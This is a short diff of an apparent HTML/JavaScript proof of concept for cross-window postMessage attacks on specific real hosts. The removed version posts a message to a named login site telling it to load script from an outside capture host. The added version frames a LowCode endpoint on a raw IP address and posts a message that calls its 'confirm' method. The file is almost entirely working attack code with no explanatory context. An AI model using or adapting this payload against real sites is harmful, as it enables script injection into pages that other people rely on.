@@ -1,7 +1,8 @@
+<iframe src="http://220.203.28.230:8015/LowCode/Window/OpenWindow?"></iframe>
 <script>
-childwin = window.open("https://xcxp.bmcc.com.cn/rights-front/dist/index.html#/login?appendParam=%257B%257D&toPath=");
+// childwin = window.open("https://xcxp.bmcc.com.cn/rights-front/dist/index.html#/login?appendParam=%257B%257D&toPath=");
 function sendMessage(){
-	childwin.postMessage({"jsURL":"https://lfzsi4li.ssrf.cvssadvisor.com","cssURL":"https://www.baidu.com/", "type":"SDK_INJECT_CIRCLE_SCRIPT"}, '*');
+	document.getElementsByTagName("iframe")[0].postMessage('{"Events":[{"MethodName":"confirm","Param":"111"}]}', '*');
 }
-(function(){setTimeout("sendMessage()", 15000);}());
+(function(){setTimeout("sendMessage()", 2000);}());
 </script>
